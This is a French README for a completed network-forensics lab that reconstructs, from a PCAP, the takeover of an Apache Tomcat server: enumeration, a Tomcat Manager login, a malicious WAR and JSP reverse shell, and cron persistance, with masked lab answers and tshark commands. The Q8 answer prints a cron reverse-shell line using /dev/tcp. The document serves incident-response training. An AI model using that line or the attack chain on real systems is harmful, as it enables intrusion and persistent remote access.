# README — Tomcat Takeover Lab

Statut : terminé  
Type : analyse PCAP, forensic réseau, SOC, réponse à incident

## Objectif du lab

L’objectif de ce lab est d’analyser une compromission d’un serveur Apache Tomcat à partir d’un fichier PCAP.

L’analyse permet d’identifier :

- l’adresse IP de l’attaquant ;
- le service exposé ;
- l’outil utilisé pour l’énumération ;
- le panneau d’administration découvert ;
- les identifiants valides ;
- le fichier WAR malveillant uploadé ;
- la JSP utilisée comme reverse shell ;
- la connexion reverse shell ;
- la persistance installée sur la machine compromise.

## Résumé de l’incident

Le serveur `**********` expose un service Apache Tomcat sur le port `****`.

L’attaquant `**********` effectue d’abord une navigation et une énumération web. Le User-Agent `************` apparaît dans les requêtes HTTP, ce qui confirme l’utilisation de Gobuster pour découvrir des chemins sensibles.

L’attaquant découvre ensuite `/*******`, puis accède à `/*******/html`. Plusieurs tentatives d’authentification Basic sont observées. La combinaison valide identifiée est `*****:******`.

Une fois connecté au Tomcat Manager, l’attaquant upload le fichier `******.***`. Ce WAR déploie une application accessible via `/******/` et contient une JSP malveillante nommée `********.***`.

La JSP lance un shell système et établit une connexion sortante vers `**********:80`. Dans le flux TCP `****`, les commandes observées montrent que l’attaquant obtient l’utilisateur `****`, se déplace dans `/tmp`, puis installe une persistance cron vers `**********:443`.

## Réponses finales du lab

| Question | Réponse |
|---|---|
| Q1 | `**********` |
| Q2 | `*****` |
| Q3 | `****` |
| Q4 | `********` |
| Q5 | `/*******` |
| Q6 | `*****:******` |
| Q7 | `******.***` |
| Q8 | `* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/*** 0>&1'` |

## Commandes principales utilisées

### Extraire les requêtes HTTP

```bash
tshark -r "web server.pcap" -Y "http.request" -T fields -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport -e http.request.method -e http.host -e http.request.uri -e http.user_agent
```

### Identifier l’upload WAR

```bash
tshark -r "web server.pcap" -Y 'http.request.method == "POST" || http.request.uri contains "upload" || http.request.uri contains "******"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e ip.dst -e http.request.method -e http.host -e http.request.uri -e http.file_data
```

### Identifier les identifiants Basic Auth

```bash
tshark -r "web server.pcap" -Y 'http.authorization || http.authbasic || http.request.uri contains "/*******/html"' -T fields -E separator='|' -e frame.number -e frame.time_relative -e ip.src -e http.request.method -e http.request.uri -e http.authorization -e http.authbasic
```

### Suivre le flux reverse shell

```bash
tshark -r "web server.pcap" -q -z follow,tcp,ascii,****
```

## Conclusion

Le serveur Tomcat a été compromis via le panneau Tomcat Manager. L’attaquant a utilisé des identifiants valides, uploadé une archive WAR malveillante, déclenché une JSP de reverse shell, obtenu un accès `****`, puis installé une persistance cron.
